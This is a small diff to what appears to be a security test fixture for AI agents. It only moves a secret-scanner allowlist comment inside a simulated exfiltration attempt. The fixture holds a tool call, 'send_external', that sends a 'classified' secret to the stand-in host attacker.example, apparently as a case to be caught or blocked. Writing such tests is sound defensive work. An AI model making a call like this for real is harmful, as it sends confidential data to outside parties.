@@ -404,9 +404,9 @@ async def exfiltration_attempt() -> AttackResult:
                     id="exfil-1",
                     name="send_external",
                     arguments={
-                        "secret": "classified",
+                        "secret": "classified",  # pragma: allowlist secret
                         "target": "attacker.example",
-                    },  # pragma: allowlist secret
+                    },
                 )
             )
         ]
